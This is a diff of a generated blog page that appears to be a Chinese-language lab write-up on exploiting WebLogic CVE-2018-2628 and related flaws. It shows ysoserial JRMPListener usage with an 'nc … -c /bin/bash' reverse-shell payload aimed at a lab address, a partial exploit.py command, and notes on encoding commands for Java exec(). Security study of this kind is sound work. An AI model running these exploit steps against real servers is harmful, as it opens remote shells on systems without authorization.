@@ -96,9 +96,10 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/2018/07/05/weblogic/10271.png">
 <meta property="og:image" content="http://yoursite.com/2018/07/05/weblogic/10271shell.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/05/weblogic/bashEncode.png">
 <meta property="og:image" content="http://yoursite.com/2018/07/05/weblogic/2628.png">
 <meta property="og:image" content="http://yoursite.com/2018/07/05/weblogic/ssrf.png">
-<meta property="og:updated_time" content="2018-07-09T07:33:35.791Z">
+<meta property="og:updated_time" content="2018-07-09T08:56:58.705Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Weblogic">
 <meta name="twitter:description" content="CVE-2017-10271、CVE-2018-2628、SSRF">
@@ -456,9 +457,10 @@ Content-Type: text/xml
 <ul>
 <li>工具</li>
 </ul>
-<p><strong><a href="https://github.com/WyyFree/vule/tree/master/vulhub/weblogic/CVE-2018-2628" target="_blank" rel="noopener">ysoserial-JRMPServer、expolit.py</a></strong></p>
+<p>1、<strong><a href="https://github.com/WyyFree/vule/tree/master/vulhub/weblogic/CVE-2018-2628" target="_blank" rel="noopener">ysoserial-JRMPServer、expolit.py</a></strong><br>2、<strong><a href="http://jackson.thuraisamy.me/runtime-exec-payloads.html" target="_blank" rel="noopener">编码</a>&nbsp;&nbsp;&nbsp;&nbsp;因为重定向和管道字符的使用方式在正在启动的进程的上下文中没有意义。例如，ls &gt; dir_listing在shell中执行应该将当前目录的列表输出到名为的文件中dir_listing。但是在exec()函数的上下文中，该命令将被解释为获取&gt;和dir_listing目录的列表</strong><br><img src="/2018/07/05/weblogic/bashEncode.png" alt="bash"></p>
 <ul>
-<li>开启JRMPServer监听<pre><code>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]
+<li><p>开启JRMPServer监听</p>
+<pre><code>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]
 e.g. java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections1 &apos;nc 172.18.0.1 8888 -c /bin/bash&apos;
 </code></pre></li>
 <li><p>使用expolit反弹shell</p>
@@ -468,7 +470,7 @@ e.g. python exploit.py 172.18.0.2 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 172
 </ul>
 <p><img src="/2018/07/05/weblogic/2628.png" alt="shell"></p>
 <ul>
-<li><strong>注：</strong><br>  1、执行命令不会返回执行结果<br>  2、执行的command中不能存在特殊字符(&gt;)</li>
+<li><strong>注：</strong><br>  1、执行命令不会返回执行结果<br>  2、执行的command中不能存在特殊字符(&gt;)，需要进行command编码才能执行</li>
 </ul>
 <p><hr></p>
 <h2 id="SSRF-Weblogic"><a href="#SSRF-Weblogic" class="headerlink" title="SSRF(Weblogic)"></a>SSRF(Weblogic)</h2><center>
@@ -552,6 +554,10 @@ The server at http://127.0.0.1:7001 returned a 404 error code
 
           <div class="post-nav-prev post-nav-item">
             
+              <a href="/2018/07/09/jboss/" rel="prev" title="jboss">
+                jboss <i class="fa fa-chevron-right"></i>
+              </a>
+            
           </div>
         </div>
       
@@ -631,7 +637,7 @@ The server at http://127.0.0.1:7001 returned a 404 error code
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
